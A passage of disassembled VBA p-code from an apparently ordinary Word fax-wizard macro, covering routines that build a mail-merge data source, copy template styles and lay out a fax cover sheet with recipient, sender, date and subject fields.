Line #764:\n' \tEndWith \n' Line #765:\n' \tLd ActiveDocument \n' \tArgsMemCall UndoClear 0x0000 \n' Line #766:\n' \tLd wdStory \n' \tLd Selection \n' \tArgsMemCall HomeKey 0x0001 \n' Line #767:\n' Line #768:\n' \tStartWithExpr \n' \tLd ActiveDocument \n' \tMemLd Content \n' \tWith \n' Line #769:\n' \tLitVarSpecial (True)\n' \tMemStWith SpellingChecked \n' Line #770:\n' \tLitVarSpecial (True)\n' \tMemStWith GrammarChecked \n' Line #771:\n' \tEndWith \n' Line #772:\n' Line #773:\n' \tExitSub \n' Line #774:\n' Line #775:\n' \tLabel FatalError \n' Line #776:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #777:\n' \tEndSub \n' Line #778:\n' Line #779:\n' \tQuoteRem 0x0000 0x0040 \"creates a data source for the cover sheet in the temp. directory\"\n' Line #780:\n' \tFuncDefn (Private Sub CreateDataSource())\n' Line #781:\n' \tDim \n' \tVarDefn objRng (As Range)\n' Line #782:\n' \tDim \n' \tVarDefn strPath (As String)\n' Line #783:\n' \tDim \n' \tVarDefn objDataSrcDoc (As Document)\n' \tVarDefn objMM (As MailMerge)\n' Line #784:\n' \tDim \n' \tVarDefn strDataSrcName (As String)\n' Line #785:\n' \tOnError FatalError \n' Line #786:\n' Line #787:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd MailMerge \n' \tSet objMM \n' Line #788:\n' \tLd wdFormLetters \n' \tLd objMM \n' \tMemSt MainDocumentType \n' Line #789:\n' Line #790:\n' \tLd fDocIsFormLtr \n' \tParen \n' \tIfBlock \n' Line #791:\n' \tLd objDataSrc \n' \tMemLd New \n' \tLd strConnectString \n' \tParamNamed Connection \n' \tLd objMM \n' \tArgsMemCall OpenDataSource 0x0002 \n' Line #792:\n' \tLd strFormLetterSQL \n' \tLd strFormLetterSQL1 \n' \tConcat \n' \tLd objMM \n' \tMemLd DataSource \n' \tMemSt QueryString \n' Line #793:\n' \tExitSub \n' Line #794:\n' \tEndIfBlock \n' Line #795:\n' Line #796:\n' \tSetStmt \n' \tLd Application \n' \tMemLd Documents \n' \tMemLd Add \n' \tSet objDataSrcDoc \n' Line #797:\n' Line #798:\n' \tSetStmt \n' \tLd objDataSrcDoc \n' \tMemLd Content \n' \tSet objRng \n' Line #799:\n' Line #800:\n' \tLd objRng \n' \tArgsCall CreateTableFromFaxInfo 0x0001 \n' Line #801:\n' Line #802:\n' \tLd wdTempFilePath \n' \tLd Options \n' \tArgsMemLd DefaultFilePath 0x0001 \n' \tSt strPath \n' Line #803:\n' \tLineCont 0x0004 0A 00 08 00\n' \tLd strPath \n' \tLitDI2 0x0001 \n' \tArgsLd Right$ 0x0002 \n' \tLd strPathSeparator \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd strPath \n' \tLd strPathSeparator \n' \tConcat \n' \tSt strPath \n' \tEndIf \n' Line #804:\n' Line #805:\n' \tLd strPath \n' \tLitStr 0x0009 \"~$CovSht@\"\n' \tConcat \n' \tLd Date \n' \tLitStr 0x0008 \"dd-mm-yy\"\n' \tArgsLd Format$$ 0x0002 \n' \tConcat \n' \tLitStr 0x0001 \",\"\n' \tConcat \n' \tLd Time \n' \tLitStr 0x0008 \"hh-mm-ss\"\n' \tArgsLd Format$$ 0x0002 \n' \tConcat \n' \tLitStr 0x0004 \".tmp\"\n' \tConcat \n' \tSt strDataSrcName \n' Line #806:\n' \tLd strDataSrcName \n' \tLd wdFormatDocument \n' \tLd objDataSrcDoc \n' \tArgsMemCall SaveAs 0x0002 \n' Line #807:\n' \tLd wdDoNotSaveChanges \n' \tLd objDataSrcDoc \n' \tArgsMemCall Close 0x0001 \n' Line #808:\n' Line #809:\n' \tQuoteRem 0x0004 0x003B \"attach the data source doc. to activedocument (cover sheet)\"\n' Line #810:\n' \tLd strDataSrcName \n' \tLd objMM \n' \tArgsMemCall OpenDataSource 0x0001 \n' Line #811:\n' Line #812:\n' \tExitSub \n' Line #813:\n' \tLabel FatalError \n' Line #814:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #815:\n' \tEndSub \n' Line #816:\n' Line #817:\n' Line #818:\n' \tQuoteRem 0x0000 0x0042 \"creates a table in the data source document with names and numbers\"\n' Line #819:\n' \tQuoteRem 0x0000 0x004C \"the format of the table is just like how one would create a data source doc.\"\n' Line #820:\n' \tQuoteRem 0x0000 0x000C \"through Word\"\n' Line #821:\n' \tFuncDefn (Private Sub CreateTableFromFaxInfo(objRange As ))\n' Line #822:\n' \tDim \n' \tVarDefn strText (As String)\n' Line #823:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #824:\n' Line #825:\n' \tOnError FatalError \n' Line #826:\n' Line #827:\n' \tLd strFLD_FAX_NAME \n' \tLd vbCr \n' \tConcat \n' \tLd strFLD_FAX_NUMBER \n' \tConcat \n' \tSt strText \n' Line #828:\n' Line #829:\n' \tQuoteRem 0x0004 0x0031 \"collect the names and numbers entered by the user\"\n' Line #830:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd iNumRcpnts \n' \tFor \n' Line #831:\n' \tLd strText \n' \tLd vbCr \n' \tConcat \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd rgstrRcpntFaxNames 0x0001 \n' \tConcat \n' \tLd vbCr \n' \tConcat \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd rgstrRcpntFaxNums 0x0001 \n' \tConcat \n' \tSt strText \n' Line #832:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #833:\n' Line #834:\n' \tLd strText \n' \tLd objRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #835:\n' \tQuoteRem 0x0004 0x0030 \"Add a table with 2 columns and iNumRcpnts+1 rows\"\n' Line #836:\n' \tLd objRange \n' \tArgsMemCall Set 0x0000 \n' Line #837:\n' \tLd vbCr \n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tAdd \n' \tLitDI2 0x0002 \n' \tLd Selection \n' \tArgsMemCall ConvertToTable 0x0003 \n' Line #838:\n' Line #839:\n' \tExitSub \n' Line #840:\n' \tLabel FatalError \n' Line #841:\n' \tLd wdDoNotSaveChanges \n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0001 \n' \tQuoteRem 0x002C 0x001A \"close the data source doc.\"\n' Line #842:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #843:\n' \tEndSub \n' Line #844:\n' Line #845:\n' \tFuncDefn (Public Function FCopyStyles(iStyle As Integer, id_FFFE As Boolean) As Boolean)\n' Line #846:\n' \tDim \n' \tVarDefn strStyleName (As String)\n' Line #847:\n' \tDim \n' \tVarDefn strLongName (As String)\n' Line #848:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #849:\n' Line #850:\n' \tOnError TemplateNotFound \n' Line #851:\n' \tLabel LFindTemplate \n' Line #852:\n' \tQuoteRem 0x0004 0x0039 \" Attempt to locate longname, then shortname template file\"\n' Line #853:\n' \tLd iLONG_NAME \n' \tSt i \n' Line #854:\n' \tLd strTemplatePath \n' \tLd iStyle \n' \tLd iLONG_NAME \n' \tArgsLd rgstrTemplateFileNames 0x0002 \n' \tConcat \n' \tSt strStyleName \n' Line #855:\n' \tLd strStyleName \n' \tSt strLongName \n' Line #856:\n' \tLd strStyleName \n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo LApplyStyles \n' \tEndIf \n' Line #857:\n' \tLabel LTryShortName \n' Line #858:\n' \tLd iSHORT_NAME \n' \tSt i \n' Line #859:\n' \tLd strTemplatePath \n' \tLd iStyle \n' \tLd iSHORT_NAME \n' \tArgsLd rgstrTemplateFileNames 0x0002 \n' \tConcat \n' \tSt strStyleName \n' Line #860:\n' Line #861:\n' \tLabel LApplyStyles \n' Line #862:\n' \tLd strAPPLYING \n' \tSt StatusBar \n' Line #863:\n' Line #864:\n' \tQuoteRem 0x0004 0x000B \" Get styles\"\n' Line #865:\n' \tLd strStyleName \n' \tParen \n' \tLd ActiveDocument \n' \tArgsMemCall CopyStylesFromTemplate 0x0001 \n' Line #866:\n' Line #867:\n' \tQuoteRem 0x0004 0x0009 \" No Error\"\n' Line #868:\n' \tLitVarSpecial (True)\n' \tSt fStylesCopied \n' Line #869:\n' \tLitStr 0x0000 \"\"\n' \tSt StatusBar \n' Line #870:\n' \tLitVarSpecial (True)\n' \tSt FCopyStyles \n' Line #871:\n' \tExitFunc \n' Line #872:\n' Line #873:\n' \tLabel TemplateNotFound \n' Line #874:\n' \tLd i \n' \tLd iLONG_NAME \n' \tEq \n' \tIfBlock \n' Line #875:\n' \tLd iSHORT_NAME \n' \tSt i \n' Line #876:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #877:\n' \tGoTo LTryShortName \n' Line #878:\n' \tEndIfBlock \n' Line #879:\n' \tLd strERR_STYLE_NOT_FOUND \n' \tLd strLongName \n' \tConcat \n' \tLd strERR_STYLE_NOT_FOUND2 \n' \tConcat \n' \tArgsCall DisplayErrorMsg 0x0001 \n' Line #880:\n' \tLitVarSpecial (False)\n' \tSt fStylesCopied \n' Line #881:\n' \tLitStr 0x0000 \"\"\n' \tSt StatusBar \n' Line #882:\n' \tLitVarSpecial (False)\n' \tSt FCopyStyles \n' Line #883:\n' \tEndFunc \n' Line #884:\n' Line #885:\n' \tQuoteRem 0x0000 0x0033 \"creates professional/Contemporary style cover sheet\"\n' Line #886:\n' \tFuncDefn (Private Sub CreateProfContCoverSheet())\n' Line #887:\n' \tDim \n' \tVarDefn objRngBuffer1 (As Range)\n' Line #888:\n' \tDim \n' \tVarDefn objRngBuffer2 (As Range)\n' Line #889:\n' \tDim \n' \tVarDefn strCmpnyName (As String)\n' \tVarDefn strName (As String)\n' Line #890:\n' \tDim \n' \tVarDefn strMFFirstName (As String)\n' \tVarDefn strMFLastName (As String)\n' \tVarDefn strMFFaxNum (As String)\n' Line #891:\n' \tDim \n' \tVarDefn objRngTextTable (As Range)\n' Line #892:\n' \tDim \n' \tVarDefn objTable (As Table)\n' Line #893:\n' Line #894:\n' \tOnError FatalError \n' Line #895:\n' Line #896:\n' \tLd iFaxStyle \n' \tLd iSTY_CONTEMPORARY \n' \tEq \n' \tIfBlock \n' Line #897:\n' \tArgsCall InsertContAutoText 0x0000 \n' Line #898:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #899:\n' \tEndIfBlock \n' Line #900:\n' Line #901:\n' \tArgsCall InsertReturnAddress 0x0000 \n' Line #902:\n' \tLd strMFFirstName \n' \tLd strMFLastName \n' \tLd strMFFaxNum \n' \tArgsCall GetMergeFieldNames 0x0003 \n' Line #903:\n' Line #904:\n' \tQuoteRem 0x0004 0x0013 \"Insert company name\"\n' Line #905:\n' \tLd formWizard \n' \tMemLd txtCompany \n' \tMemLd Then \n' \tSt strCmpnyName \n' Line #906:\n' \tLd iFaxStyle \n' \tLd iSTY_PROFESSIONAL \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #907:\n' \tLd strCmpnyName \n' \tFnLen \n' \tParen \n' \tIfBlock \n' Line #908:\n' \tLd strSTY_COMPANY_NAME \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #909:\n' \tLd strCmpnyName \n' \tLd vbCr \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #910:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #911:\n' \tEndIfBlock \n' Line #912:\n' \tQuoteRem 0x0008 0x000C \"Insert title\"\n' Line #913:\n' \tLd strSTY_DOC_LABEL \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #914:\n' \tLd iFaxStyle \n' \tArgsLd rgstrFaxTitle 0x0001 \n' \tLd vbCr \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #915:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #916:\n' \tEndIfBlock \n' Line #917:\n' Line #918:\n' Line #919:\n' Line #920:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngTextTable \n' Line #921:\n' Line #922:\n' \tQuoteRem 0x0000 0x003F \"the topics To: and From: have a character style which has to be\"\n' Line #923:\n' \tQuoteRem 0x0000 0x003E \"applied after the data has been written (since the data have a\"\n' Line #924:\n' \tQuoteRem 0x0000 0x0028 \"different style). so, use a range buffer\"\n' Line #925:\n' Line #926:\n' \tQuoteRem 0x0004 0x003E \"1st line text has style \"Message Header First\". The subsequent\"\n' Line #927:\n' \tQuoteRem 0x0004 0x001B \"lines have \"Message Header\"\"\n' Line #928:\n' Line #929:\n' \tQuoteRem 0x0004 0x000A \"Insert To:\"\n' Line #930:\n' \tLd strSTY_MSG_HDR_FIRST \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #931:\n' \tLd strTO \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #932:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #933:\n' Line #934:\n' \tQuoteRem 0x0004 0x0015 \"insert recipient name\"\n' Line #935:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tEq \n' \tParen \n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #936:\n' \tLd vbTab \n' \tLitDI2 0x0000 \n' \tArgsLd rgstrRcpntFaxNames 0x0001 \n' \tConcat \n' \tLd vbTab \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #937:\n' \tElseBlock \n' Line #938:\n' \tQuoteRem 0x0008 0x0018 \"insert appropriate field\"\n' Line #939:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #940:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #941:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tLd fDocIsFormLtr \n' \tParen \n' \tOr \n' \tParen \n' \tIfBlock \n' Line #942:\n' \tLd objActiveRange \n' \tLd wdFieldMergeField \n' \tLd strMFFirstName \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' Line #943:\n' \tLd strMFLastName \n' \tFnLen \n' \tIfBlock \n' Line #944:\n' \tLd strSPACE \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #945:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #946:\n' \tLd objActiveRange \n' \tLd wdFieldMergeField \n' \tLd strMFLastName \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' Line #947:\n' \tEndIfBlock \n' Line #948:\n' \tElseBlock \n' Line #949:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_NAME \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #950:\n' \tEndIfBlock \n' Line #951:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #952:\n' \tEndIfBlock \n' Line #953:\n' Line #954:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #955:\n' Line #956:\n' \tQuoteRem 0x0004 0x000C \"Insert From:\"\n' Line #957:\n' \tLd strFROM \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #958:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer2 \n' Line #959:\n' Line #960:\n' \tQuoteRem 0x0004 0x0014 \"insert sender's name\"\n' Line #961:\n' \tLd formWizard \n' \tMemLd txtSenderName \n' \tMemLd Then \n' \tSt strName \n' Line #962:\n' \tLd strName \n' \tFnLen \n' \tIfBlock \n' Line #963:\n' \tLd vbTab \n' \tLd strName \n' \tConcat \n' \tLd vbCr \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #964:\n' \tElseBlock \n' Line #965:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #966:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #967:\n' \tQuoteRem 0x0008 0x0019 \"insert macrobutton field.\"\n' Line #968:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_NAME \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #969:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraphAfter 0x0000 \n' Line #970:\n' \tEndIfBlock \n' Line #971:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #972:\n' \tQuoteRem 0x0004 0x001E \"set character style for topics\"\n' Line #973:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #974:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer2 \n' \tMemSt Style \n' Line #975:\n' Line #976:\n' \tQuoteRem 0x0004 0x0026 \"next 3 lines in \"Message Header\" style\"\n' Line #977:\n' \tQuoteRem 0x0004 0x0011 \"Insert Fax Number\"\n' Line #978:\n' \tLd wdStyleMessageHeader \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #979:\n' Line #980:\n' \tLd strFAX \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #981:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #982:\n' Line #983:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tEq \n' \tParen \n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #984:\n' \tLd vbTab \n' \tLitDI2 0x0000 \n' \tArgsLd rgstrRcpntFaxNums 0x0001 \n' \tConcat \n' \tLd vbTab \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #985:\n' \tElseBlock \n' Line #986:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #987:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #988:\n' \tQuoteRem 0x0008 0x001C \"insert the appropriate field\"\n' Line #989:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tLd fDocIsFormLtr \n' \tParen \n' \tOr \n' \tParen \n' \tIfBlock \n' Line #990:\n' \tLd objActiveRange \n' \tLd wdFieldMergeField \n' \tLd strMFFaxNum \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' Line #991:\n' \tElseBlock \n' Line #992:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_FAX_NUMBER \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #993:\n' \tEndIfBlock \n' Line #994:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #995:\n' \tEndIfBlock \n' Line #996:\n' Line #997:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #998:\n' Line #999:\n' \tQuoteRem 0x0004 0x000B \"Insert Date\"\n' Line #1000:\n' \tLd strDATE \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1001:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer2 \n' Line #1002:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1003:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1004:\n' \tQuoteRem 0x0004 0x0010 \"insert datefield\"\n' Line #1005:\n' \tLd objActiveRange \n' \tLd wdFieldTime \n' \tLitStr 0x0003 \"\\@ \"\n' \tLd strQUOTE \n' \tConcat \n' \tLd strDATE_FORMAT \n' \tConcat \n' \tLd strQUOTE \n' \tConcat \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' Line #1006:\n' Line #1007:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraphAfter 0x0000 \n' Line #1008:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1009:\n' \tQuoteRem 0x0004 0x001E \"set character style for topics\"\n' Line #1010:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1011:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer2 \n' \tMemSt Style \n' Line #1012:\n' Line #1013:\n' Line #1014:\n' \tQuoteRem 0x0004 0x0009 \"Next line\"\n' Line #1015:\n' \tQuoteRem 0x0004 0x000C \"Insert Phone\"\n' Line #1016:\n' \tLd strPHONE \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1017:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #1018:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1019:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1020:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_PHONE_NUMBER \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #1021:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1022:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1023:\n' Line #1024:\n' \tQuoteRem 0x0004 0x000D \"Insert Pages:\"\n' Line #1025:\n' \tLd strPAGES \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1026:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer2 \n' Line #1027:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1028:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1029:\n' Line #1030:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_PAGES \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #1031:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraphAfter 0x0000 \n' Line #1032:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1033:\n' \tQuoteRem 0x0004 0x001E \"set character style for topics\"\n' Line #1034:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1035:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer2 \n' \tMemSt Style \n' Line #1036:\n' Line #1037:\n' \tQuoteRem 0x0004 0x000A \"Insert Re:\"\n' Line #1038:\n' \tLd strRE \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1039:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #1040:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1041:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1042:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_SUBJECT \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #1043:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1044:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1045:\n' Line #1046:\n' \tQuoteRem 0x0004 0x000A \"Insert CC:\"\n' Line #1047:\n' \tLd strCC \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1048:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer2 \n' Line #1049:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1050:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1051:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_NAME \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #1052:\n' Line #1053:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1054:\n' \tQuoteRem 0x0004 0x001E \"set character style for topics\"\n' Line #1055:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1056:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer2 \n' \tMemSt Style \n' Line #1057:\n' Line #1058:\n' \tQuoteRem 0x0004 0x001D \"convert the text into a table\"\n' Line #1059:\n' \tLd objActiveRange \n' \tMemLd End \n' \tLd objRngTextTable \n' \tMemSt End \n' Line #1060:\n' \tLd objRngTextTable \n' \tArgsMemCall Set 0x0000 \n' Line #1061:\n' \tSetStmt \n' \tLd vbTab \n' \tLitDI2 0x0004 \n' \tLitDI2 0x0004 \n' \tLitVarSpecial (True)\n' \tParamNamed AutoFit \n' \tLitDI2 0x0000 \n' \tParamNamed Format$ \n' \tLd Selection \n' \tArgsMemLd ConvertToTable 0x0005 \n' \tSet objTable \n' Line #1062:\n' \tStartWithExpr \n' \tLd objTable \n' \tWith \n' Line #1063:\n' \tLitVarSpecial (False)\n' \tMemLdWith Borders \n' \tMemSt Enable \n' Line #1064:\n' \tLitDI2 0x0000 \n' \tMemLdWith Rows \n' \tMemSt SpaceBetweenColumns \n' Line #1065:\n' \tLd iFaxStyle \n' \tLd iSTY_CONTEMPORARY \n' \tEq \n' \tIfBlock \n' Line #1066:\n' \tLd sCONT_LEFT_INDENT \n' \tMemLdWith Rows \n' \tMemSt LeftIndent \n' Line #1067:\n' \tElseBlock \n' \tQuoteRem 0x000D 0x0017 \"for professional style.\"\n' Line #1068:\n' \tQuoteRem 0x0008 0x0034 \"contemporary has autotext entry to insert the lines.\"\n' Line #1069:\n' \tLd Selection \n' \tMemLd Cells \n' \tArgsMemCall AutoFit 0x0000 \n' Line #1070:\n' \tLd sCONT_WIDTH_COL1 \n' \tLitDI2 0x0002 \n' \tArgsMemLdWith Columns 0x0001 \n' \tMemSt With \n' Line #1071:\n' \tLd sCONT_WIDTH_COL1 \n' \tLitDI2 0x0004 \n' \tArgsMemLdWith Columns 0x0001 \n' \tMemSt With \n' Line #1072:\n' \tLitVarSpecial (True)\n' \tLd wdBorderHorizontal \n' \tMemLdWith Rows \n' \tArgsMemLd Borders 0x0001 \n' \tMemSt Visible \n' Line #1073:\n' \tLitVarSpecial (True)\n' \tLd wdBorderBottom \n' \tArgsMemLdWith Borders 0x0001 \n' \tMemSt Visible \n' Line #1074:\n' \tEndIfBlock \n' Line #1075:\n' \tEndWith \n' Line #1076:\n' \tQuoteRem 0x0004 0x0030 \"convert to table inserts a vbCr after the table.\"\n' Line #1077:\n' \tArgsCall InsertCheckBoxes 0x0000 \n' Line #1078:\n' \tArgsCall InsertBodyText 0x0000 \n' Line #1079:\n' Line #1080:\n' \tLd iFaxStyle \n' \tLd iSTY_CONTEMPORARY \n' \tEq \n' \tIfBlock \n' Line #1081:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd Content \n' \tSet objActiveRange \n' Line #1082:\n' \tLd wdCollapseStart \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1083:\n' \tQuoteRem 0x0008 0x000C \"Insert title\"\n' Line #1084:\n' \tLd strSTY_DOC_LABEL \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1085:\n' \tLd iFaxStyle \n' \tArgsLd rgstrFaxTitle 0x0001 \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' \tQuoteRem 0x003D 0x0007 \" & vbCr\"\n' Line #1086:\n' \tQuoteRem 0x0004 0x0029 \"    objActiveRange.Collapse wdCollapseEnd\"\n' Line #1087:\n' \tEndIfBlock \n' Line 